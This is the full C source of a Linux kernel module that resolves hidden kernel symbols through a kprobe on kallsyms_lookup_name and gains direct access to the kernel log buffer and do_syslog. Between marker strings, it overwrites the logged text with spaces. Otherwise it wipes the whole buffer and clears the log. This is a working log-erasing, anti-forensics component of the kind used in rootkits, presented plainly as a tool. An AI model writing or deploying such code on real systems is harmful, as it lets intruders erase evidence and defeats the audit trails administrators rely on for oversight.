#include <linux/init.h> 
#include <linux/module.h>
#include <linux/syslog.h>
#include <linux/kernel.h>
/*--------------------- do_syslog() <- kernel/printk.c ------------------------------------------------
SYSLOG_ACTION_CLEAR 	  //Clear ring buffer
SYSLOG_ACTION_SIZE_UNREAD //Number of chars in the log buffer
SYSLOG_ACTION_CONSOLE_OFF //Disable logging to console
SYSLOG_ACTION_CONSOLE_ON  //Enable logging to console
*/
#define LKM_LOG_FLAG_NONE  0x00
#define LKM_LOG_FLAG_START 0x01
#define LKM_LOG_FLAG_END   0x02
struct lkm_log_struct {
	int len;
	char *buf;
	long sign_end;
	long sign_start;
	void *start;
	void *end;
	char flags;
};
static struct lkm_log_struct lkm_log = {0};
int (*lkm_do_syslog)(int type, char *buf, int len, int from_file) = NULL;

static int lkm_log_fsign(struct lkm_log_struct *log); 
void lkm_log_white(struct lkm_log_struct *log); 
int lkm_log_clean(struct lkm_log_struct *log); 
void lkm_log_white(struct lkm_log_struct *log); 
int lkm_log_begin(struct lkm_log_struct *log); 
int lkm_log_end(struct lkm_log_struct *log);

#include <linux/kprobes.h>
static unsigned long (*find_sym)(const char *name) = NULL;	//Will be "kallsyms_lookup_name()
static unsigned long get_find_sym(void) {

		char *need_name = "kallsyms_lookup_name";
		struct kprobe kp = {
			.symbol_name = need_name,
		};
		if(register_kprobe(&kp) < 0) return 0;

		find_sym = (unsigned long(*)(const char *name))kp.addr;
		unregister_kprobe(&kp);
		if((long)find_sym==(long)-1) find_sym = 0;

	return (unsigned long)find_sym;
}
static unsigned long sym2addr(const char *name) {

		if(!find_sym) {
		get_find_sym();
	}
	if(name && find_sym) return find_sym(name);

	return 0;
}
/////////////////// DEBUG /////////////////////////////////////////////////////////////
static void lkm_log_dump(struct lkm_log_struct *log); 
static void test1(void) {

	unsigned long lkm_logged_chars = sym2addr("logged_chars");
	printk(KERN_INFO "	addr: logged_chars=0x%lx\n", lkm_logged_chars);

	unsigned long lkm_log_start = sym2addr("log_start");
	printk(KERN_INFO "	addr: log_start=0x%lx\n", lkm_log_start);

	unsigned long lkm_log_end = sym2addr("log_end");
	printk(KERN_INFO "	addr: log_end=0x%lx\n", lkm_log_end);

	printk(KERN_INFO "********************* \n");
	lkm_log_dump(&lkm_log);
	printk(KERN_INFO "********************* \n");
	return;
}
static void lkm_log_dump(struct lkm_log_struct *log) {

	long range = 0;
	if(log->start && log->end) {
		range = log->end - log->start;
	}
	printk(KERN_INFO "------ DUMP_LKM_LOG:\n");
	printk(KERN_INFO "buf(0x%lx) | len(0x%x) | sign_start(0x%lx) | sign_end(0x%lx) | start(0x%lx) | end(0x%lx) | range(%ld)\n", (long)log->buf, log->len, (long)log->sign_start, (long)log->sign_end, (long)log->start, (long)log->end, range);
	printk(KERN_INFO "_____________________________________\n");
	return;
}
///////////////////////////////////////////////////////////////////////////////
static int lkm_log_fsign(struct lkm_log_struct *log) {

	int len = log->len;
	char *buf = log->buf;
	long sige = log->sign_end;
	long sigs = log->sign_start;
	void *start = NULL;
	void *end = NULL;
	int flags = 0;
	int flage = 0;
	int ret = -1;
	if(!buf || !sigs || !sige) return -1;

	for(int i=0; i<len; i++) {
		long a = *(long*)(buf+i);
		if((a&0xffffffffffffff)==sigs) {
			if(flags) return -1;
			start = (void*)buf+i;
			flags = 1;
			//i = i+6;
			continue;
		}
		else if((a&0xffffffffffffff)==sige) {
			if(flage) return -1;
			end = (void*)buf+i;
			flage = 1;
			//i = i+6;
			continue;

		}
		if(start && end) {
			ret = 0;
			break;
		}
	}

	log->start = start;
	log->end = end;
	return ret;
} 
int lkm_log_clean(struct lkm_log_struct *log) {
	void *s = log->start;
	void *e = log->end;
	char *buf = log->buf;
	if(!buf || !s || !e) return -1;

	long r = (long)e-(long)s; 
	if(r>0) {
		memset(s, ' ', r+7);
	}
	else if(r<0) {
		r = ((unsigned long)buf+(unsigned long)log->len) - (unsigned long)s;
		memset(s, ' ', r);
		r = (unsigned long)e-(unsigned long)buf;
		memset(buf, ' ', r+7);
	}
	return 0;
}
void lkm_log_white(struct lkm_log_struct *log) {
	memset(log->buf, 0x21, log->len);
	if(!lkm_do_syslog) return;
	lkm_do_syslog(SYSLOG_ACTION_CLEAR, NULL, 0, 0);
}
int lkm_log_begin(struct lkm_log_struct *log) {
	if(log->flags&LKM_LOG_FLAG_START) return -1;

	printk(KERN_INFO "	{{{{{ LOG_BEGIN:");
	printk(KERN_INFO "%s", (char*)&log->sign_start);
	log->flags = log->flags|LKM_LOG_FLAG_START;

	lkm_log_dump(log);
	return 0;
}
int lkm_log_end(struct lkm_log_struct *log) {
	if(!(log->flags&LKM_LOG_FLAG_START)) return -1;

	printk(KERN_INFO "%s", (char*)&log->sign_end);
  	printk(KERN_INFO "	 LOG_END }}}}}");
	if(!lkm_log_fsign(log)) { lkm_log_clean(log); }
	else 			{ lkm_log_white(log); };
	log->start = NULL;
	log->end = NULL;
	log->flags = LKM_LOG_FLAG_NONE;

	lkm_log_dump(log);
	return 0;
}

static int __init lkm_log_init(void) {
	printk(KERN_INFO "++++++ LKM_LOG, ale-alE-aLE-OP ++++++\n");

	lkm_do_syslog = (int(*)(int type, char *buf, int len, int data))sym2addr("do_syslog");
	if(!lkm_do_syslog) return -1;
	char *buf = (char*)sym2addr("log_buf");
	lkm_log.buf = (char*)*(long*)buf;
	lkm_log.len = lkm_do_syslog(SYSLOG_ACTION_SIZE_BUFFER, NULL, 0, 0);
	
	lkm_log.sign_start = 0x0041424344454639;//"9FEDCBA"
	lkm_log.sign_end   = 0x0039464544434241;//"ABCDEF9"
					
	lkm_log_white(&lkm_log);
	lkm_log_begin(&lkm_log);
	lkm_log_end(&lkm_log);
	lkm_log_begin(&lkm_log);
	test1();
	lkm_log_end(&lkm_log);
	return 0;
}
static void __exit lkm_log_exit(void) {

	printk(KERN_INFO "++++++ LKM_LOG, HN-Hn-hn ++++++\n");
	return;
}
module_init(lkm_log_init);
module_exit(lkm_log_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("PARFIK");
MODULE_DESCRIPTION("Log LKM...");
MODULE_VERSION("0.01");
